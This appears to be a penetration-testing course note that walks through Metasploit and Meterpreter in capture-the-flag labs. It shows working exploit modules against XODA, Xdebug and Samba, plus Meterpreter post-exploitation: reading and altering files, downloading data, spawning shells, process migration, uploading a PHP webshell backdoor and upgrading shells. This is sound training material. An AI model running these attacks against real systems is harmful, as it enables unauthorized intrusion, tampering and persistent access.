# Meterpreter - MSF

<pre class="language-bash"><code class="lang-bash"><strong>ip -br -c a
</strong>service postgresql start &#x26;&#x26; msfconsole -q
</code></pre>

```bash
db_status
setg RHOSTS 192.78.84.3
setg RHOST 192.78.84.3
workspace -a meterpreter
```

* Perform an `nmap` scan directly into MSF

```bash
db_nmap -sV 192.78.84.3
```

```bash
80/tcp   open http Apache httpd 2.4.7 ((Ubuntu))
3306/tcp open mysql MySQL 5.5.47-0ubuntu0.14.04.1
```

```bash
curl http://192.78.84.3
```

<figure><img src="../../../../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>

```bash
mf5 > search xoda
mf5 > use exploit/unix/webapp/xoda_file_upload
mf5 > info
# Description:
#   This module exploits a file upload vulnerability found in XODA 
#   0.4.5. Attackers can abuse the "upload" command in order to upload a 
#   malicious PHP file without any authentication, which results in 
#   arbitrary code execution. The module has been tested successfully on 
#   XODA 0.4.5 and Ubuntu 10.04.
mf5 > set TARGETURI /
mf5 > run
```

<figure><img src="../../../../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>

## Meterpreter Commands <a href="#meterpreter-commands" id="meterpreter-commands"></a>

* In the **`Meterpreter`** session

### help

```bash
meterpreter > help
```

```bash
Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    chmod         Change the permissions of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    portfwd       Forward a local port to a remote service


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system's local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system, such as OS


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play an audio file on target system, nothing written on disk
```

### sysinfo

```bash
meterpreter > sysinfo
```

```bash
Computer    : victim-1
OS          : Linux victim-1 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64
Meterpreter : php/linux
```

### getuid

```bash
meterpreter > getuid
```

<pre class="language-bash"><code class="lang-bash"><strong>Server username: www-data (33)
</strong></code></pre>

* Unprivileged session with the `www-data` user

### background <a href="#background" id="background"></a>

```bash
background
```

* Keyboard shortcut: `CTRL+Z`

```bash
mf5 > sessions
```

```bash
Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         meterpreter php/linux  www-data (33) @ victim-1  192.78.84.2:4444 -> 192.78.84.3:35472 (192.78.84.3)
```

```bash
mf5 > sessions -h
```

```bash
OPTIONS:
    -C <opt>  Run a Meterpreter Command on the session given with -i, or all
    -K        Terminate all sessions
    -S <opt>  Row search filter.
    -c <opt>  Run a command on the session given with -i, or all
    -d        List all inactive sessions
    -h        Help banner
    -i <opt>  Interact with the supplied session ID
    -k <opt>  Terminate sessions by session ID and/or range
    -l        List all active sessions
    -n <opt>  Name or rename a session by ID
    -q        Quiet mode
    -s <opt>  Run a script or module on the session given with -i, or all
    -t <opt>  Set a response timeout (default: 15)
    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
    -v        List all active sessions in verbose mode
    -x        Show extended information in the session table
```

```bash
# Switch between sessions Ids with
mf5 > sessions 1

# Rename sessions
mf5 > sessions -n xoda -i 1

# Run a Meterpreter Command on the session given with `-i`
mf5 > sessions -C sysinfo -i 1

# Terminate a specific session
mf5 > sessions -k 1
```

### pwd / cd / ls <a href="#pwd-cd-ls" id="pwd-cd-ls"></a>

```bash
pwd
	/app/files
```

```bash
cd ..

ls
	Listing: /app
	[...]
```

### cat / edit <a href="#cat-edit" id="cat-edit"></a>

```bash
cat flag1
edit flag1
	# Edit file with vim
```

### download

```bash
cd ..
download flag5.zip
background
unzip flag5.zip
	# password is 56784
cat list
	MD5 hash of /bin/bash
```

### checksum <a href="#checksum" id="checksum"></a>

```bash
checksum md5 /bin/bash
    164ebd6889588da166a52ca0d57b9004
```

### getenv <a href="#getenv" id="getenv"></a>

```bash
getenv PATH
```

```bash
Environment Variables
=====================
Variable  Value
--------  -----
PATH      /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

```bash
getenv TERM
```

```bash
[-] None of the specified environment variables were found/set.
# Correct for the "www-data" user
```

### search <a href="#search" id="search"></a>

```bash
search -d /usr/bin -f *backdoor*
	/usr/bin\backdoor (66 bytes)
```

```bash
search -f *.php
    Found 5 results...
        .\config.php (1284 bytes)
        .\functions.php (40563 bytes)
        .\index.php (57739 bytes)
        .\phpinfo.php (19 bytes)
        .\zipstream.php (18850 bytes)
```

### shell <a href="#shell" id="shell"></a>

```bash
shell
```

* Open a native Linux `bash` sessions by running after the `shell` command

```bash
/bin/bash -i
```

```bash
www-data@victim-1:/app$
```

* Terminate the `shell` session with **`CTRL+C`** or with `exit` command

### ps <a href="#ps" id="ps"></a>

```bash
ps
```

```bash
Process List
============
 PID  Name              User      Path
 ---  ----              ----      ----
 1    /bin/bash         root      /bin/bash /startup.sh
 7    logger            root      logger -loc 1 --dont_kill
 8    logger            root      logger -loc 2 --dont_kill
 9    logger            root      logger -loc 3 --dont_kill
 10   logger            root      logger -loc 4 --dont_kill
 11   logger            root      logger -loc 5 --dont_kill
 12   logger            root      logger -loc 6 --dont_kill
 [...]
```

### migrate <a href="#migrate" id="migrate"></a>

```bash
migrate 585
```

* It could not work due to lack of sufficient privileges/permissions

```bash
migrate -N apache2
```

### ifconfig <a href="#ifconfig" id="ifconfig"></a>

```bash
ifconfig
```

* Works on Windows O.S.

### execute <a href="#execute" id="execute"></a>

```bash
execute -f ifconfig
```

### mkdir / rmdir <a href="#mkdir-rmdir" id="mkdir-rmdir"></a>

```basic
mkdir test
rmdir test
```

## 🔬 Lab 1

> 🔬 [Meterpreter Basics](https://www.attackdefense.com/challengedetails?cid=193)
>
> * Target IP: `192.78.84.3`
> * Usage of the **Meterpreter** payload
> * [Meterpreter](https://www.offsec.com/metasploit-unleashed/about-meterpreter/)

* Scan the target using dirb tool.

```bash
dirb http://192.78.84.3  
```

<figure><img src="../../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

* Access `phpinfo.php` file using curl to find more information about the web server.

```
curl http://192.78.84.3/phpinfo.php
```

<figure><img src="../../../../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

```bash
use exploit/unix/http/xdebug_unauth_exec
set RHOSTS 192.78.84.3
set LHOST 192.78.84.3
exploit
```

1. Check the present working directory on remote (exploited) machine.

```bash
meterpreter > pwd
    /app
```

2. List the files present in present working directory of the remote machine.

```bash
meterpreter > ls
```

```bash
Listing: /app
=============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40777/rwxrwxrwx   4096   dir   2016-02-15 10:35:00 +0000  .git
40755/rwxr-xr-x   4096   dir   2024-07-30 13:25:11 +0000  .xoda
100777/rwxrwxrwx  10273  fil   2016-02-15 10:35:00 +0000  LICENSE
100777/rwxrwxrwx  8703   fil   2018-10-05 18:41:42 +0000  README
100777/rwxrwxrwx  79     fil   2016-02-15 10:35:00 +0000  README.md
40777/rwxrwxrwx   4096   dir   2018-10-06 06:33:10 +0000  Secret Files
100777/rwxrwxrwx  1284   fil   2018-10-05 18:41:42 +0000  config.php
40777/rwxrwxrwx   4096   dir   2024-07-30 13:27:56 +0000  files
100777/rwxrwxrwx  33     fil   2018-10-06 05:13:55 +0000  flag1
100777/rwxrwxrwx  208    fil   2018-10-06 05:19:22 +0000  flag5.zip
100777/rwxrwxrwx  40563  fil   2018-10-05 18:41:42 +0000  functions.php
100777/rwxrwxrwx  57739  fil   2018-10-05 18:41:42 +0000  index.php
40777/rwxrwxrwx   4096   dir   2018-10-05 18:41:42 +0000  js
100777/rwxrwxrwx  14598  fil   2016-02-15 10:35:00 +0000  logo.png
100777/rwxrwxrwx  5265   fil   2018-10-05 18:41:42 +0000  mobile.css
100777/rwxrwxrwx  19     fil   2016-02-15 10:35:00 +0000  phpinfo.php
100777/rwxrwxrwx  5758   fil   2018-10-05 18:41:42 +0000  style.css
40777/rwxrwxrwx   4096   dir   2018-10-05 18:41:42 +0000  xd_icons
100777/rwxrwxrwx  18850  fil   2018-10-05 18:41:42 +0000  zipstream.php
```

3. Check the present working directory on local (attacker) machine.

<pre class="language-bash"><code class="lang-bash">meterpreter > lpwd
<strong>    /root
</strong></code></pre>

4. List the files present in present working directory of the local machine.

```bash
meterpreter > lls
```

```bash
Listing Local: /root
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  570   fil   2017-10-30 12:46:42 +0000  .bashrc
40700/rwx------   4096  dir   2024-07-30 14:02:24 +0000  .cache
40755/rwxr-xr-x   4096  dir   2024-07-30 13:24:37 +0000  .msf4
40755/rwxr-xr-x   4096  dir   2019-05-26 16:35:23 +0000  .npm
100644/rw-r--r--  148   fil   2017-10-30 12:46:42 +0000  .profile
100644/rw-r--r--  13    fil   2019-02-07 07:54:01 +0000  .vimrc
100644/rw-r--r--  165   fil   2019-05-26 16:35:28 +0000  .wget-hsts
100644/rw-r--r--  293   fil   2019-02-07 07:54:01 +0000  README
40755/rwxr-xr-x   4096  dir   2019-05-26 16:36:00 +0000  tools
40755/rwxr-xr-x   4096  dir   2019-02-07 07:54:01 +0000  wordlists
```

5. Get the flag value present in /app/flag1 file.

```bash
meterpreter > cat /app/flag1
    5c50a439f040922188a22f88cecc5277
```

6. Change the flag value present in /app/flag1, so that no one else can get the right flag.

```bash
meterpreter > edit /app/flag1
meterpreter > cat /app/flag1
    2188a22f88cecc5277
```

7. Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.

```bash
meterpreter > cd "Secret Files"
meterpreter > ls
    Listing: /app/Secret Files
    ==========================
    
    Mode              Size  Type  Last modified              Name
    ----              ----  ----  -------------              ----
    100777/rwxrwxrwx  33    fil   2018-10-06 05:16:03 +0000  .flag2
    
meterpreter > cat .flag2
    bbbb3ed27502614e27bff65faea008a0
```

8. Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag.

```bash
meterpreter > download flag5.zip
[*] Downloading: flag5.zip -> flag5.zip
[*] Downloaded 208.00 B of 208.00 B (100.0%): flag5.zip -> flag5.zip
[*] download   : flag5.zip -> flag5.zip
```

<figure><img src="../../../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

9. Delete the .zip file from the directory.

```bash
meterpreter > rm flag5.zip
meterpreter > ls
    Listing: /app
    =============
    
    Mode              Size   Type  Last modified              Name
    ----              ----   ----  -------------              ----
    40777/rwxrwxrwx   4096   dir   2016-02-15 10:35:00 +0000  .git
    40755/rwxr-xr-x   4096   dir   2024-07-30 13:25:11 +0000  .xoda
    100777/rwxrwxrwx  10273  fil   2016-02-15 10:35:00 +0000  LICENSE
    100777/rwxrwxrwx  8703   fil   2018-10-05 18:41:42 +0000  README
    100777/rwxrwxrwx  79     fil   2016-02-15 10:35:00 +0000  README.md
    40777/rwxrwxrwx   4096   dir   2018-10-06 06:33:10 +0000  Secret Files
    100777/rwxrwxrwx  1284   fil   2018-10-05 18:41:42 +0000  config.php
    40777/rwxrwxrwx   4096   dir   2024-07-30 13:27:56 +0000  files
    100777/rwxrwxrwx  19     fil   2024-07-30 14:43:00 +0000  flag1
    100777/rwxrwxrwx  40563  fil   2018-10-05 18:41:42 +0000  functions.php
    100777/rwxrwxrwx  57739  fil   2018-10-05 18:41:42 +0000  index.php
    40777/rwxrwxrwx   4096   dir   2018-10-05 18:41:42 +0000  js
    100777/rwxrwxrwx  14598  fil   2016-02-15 10:35:00 +0000  logo.png
    100777/rwxrwxrwx  5265   fil   2018-10-05 18:41:42 +0000  mobile.css
    100777/rwxrwxrwx  19     fil   2016-02-15 10:35:00 +0000  phpinfo.php
    100777/rwxrwxrwx  5758   fil   2018-10-05 18:41:42 +0000  style.css
    40777/rwxrwxrwx   4096   dir   2018-10-05 18:41:42 +0000  xd_icons
    100777/rwxrwxrwx  18850  fil   2018-10-05 18:41:42 +0000  zipstream.php
```

10. Print checksum of file mentioned in the extracted file (Refer to Q8).

```bash
meterpreter > checksum md5 /bin/bash
    164ebd6889588da166a52ca0d57b9004  /bin/bash
```

11. Check the PATH environment variable on the remote machine.

```bash
meterpreter > getenv PATH

    Environment Variables
    =====================
    
    Variable  Value
    --------  -----
    PATH      /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

12. There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.

```bash
meterpreter > search -d /usr/bin -f *ckdo*
    Found 1 result...
        /usr/bin\backdoor (66 bytes)
```

13. Change to tools directory on the local machine.

```bash
meterpreter > lcd tools
meterpreter > pwd
    /app
meterpreter > lls
    Listing Local: /root/tools
    ==========================
    
    Mode             Size  Type  Last modified              Name
    ----             ----  ----  -------------              ----
    40755/rwxr-xr-x  4096  dir   2019-02-07 07:54:01 +0000  Delorean
    40755/rwxr-xr-x  4096  dir   2019-05-16 16:38:38 +0000  GitTools
    40755/rwxr-xr-x  4096  dir   2019-02-07 07:54:01 +0000  JohnTheRipper
    40755/rwxr-xr-x  4096  dir   2019-04-28 15:04:26 +0000  exfil
    40755/rwxr-xr-x  4096  dir   2019-02-07 07:54:01 +0000  firepwd
    40755/rwxr-xr-x  4096  dir   2019-02-07 07:54:01 +0000  ircsnapshot
    40755/rwxr-xr-x  4096  dir   2019-02-07 07:54:01 +0000  known_hosts-hashcat
    40755/rwxr-xr-x  4096  dir   2019-05-14 10:12:15 +0000  portable
    40755/rwxr-xr-x  4096  dir   2019-02-07 07:54:01 +0000  reGeorg
    40755/rwxr-xr-x  4096  dir   2019-02-07 07:54:01 +0000  scripts
    40755/rwxr-xr-x  4096  dir   2019-05-26 16:57:28 +0000  srtp-decrypt
    40755/rwxr-xr-x  4096  dir   2019-02-07 07:54:01 +0000  steganography
```

14. Upload a PHP webshell to app directory of the remote machine.

```bash
meterpreter > upload /usr/share/webshells/php/php-backdoor.php
    [*] uploading  : /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php
    [*] Uploaded -1.00 B of 2.73 KiB (-0.04%): /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php
    [*] uploaded   : /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php
```

## 🔬 Lab 2 <a href="#lab-2" id="lab-2"></a>

> 🔬 Same [Samba SMB Exploitation lab](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/samba-msf-exp)
>
> * Target IP: `192.151.144.3`
> * Metasploit **`post/multi/manage/shell_to_meterpreter`** module

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.151.144.3
setg RHOST 192.151.144.3
workspace -a Upgrade_Shells
```

* Perform an `nmap` scan directly into MSF

```bash
db_nmap -sV 192.151.144.3
```

```bash
[*] Nmap: PORT    STATE SERVICE     VERSION
[*] Nmap: 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: MAC Address: 02:42:C0:97:90:03 (Unknown)
```

```bash
msf5 > search type:exploit  name:samba
msf5 > use exploit/linux/samba/is_known_pipename
msf5 > options
msf5 > run
```

<figure><img src="../../../../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

### Manual Shell to Meterpreter <a href="#manual-shell-to-meterpreter" id="manual-shell-to-meterpreter"></a>

* This Linux command shell is not as advanced as `Meterpreter`.
* Upgrade the command shell to a `Meterpreter` session on the target system

```bash
background # or CTRL+Z
sessions
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST eth1
run

sessions
sessions 2
exit
```

<figure><img src="../../../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

### Auto Shell to Meterpreter <a href="#auto-shell-to-meterpreter" id="auto-shell-to-meterpreter"></a>

* Use the sessions **`-u`** option to upgrade the shell to a `Meterpreter` session

```bash
sessions -u 1
sessions 3
```

<figure><img src="../../../../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>
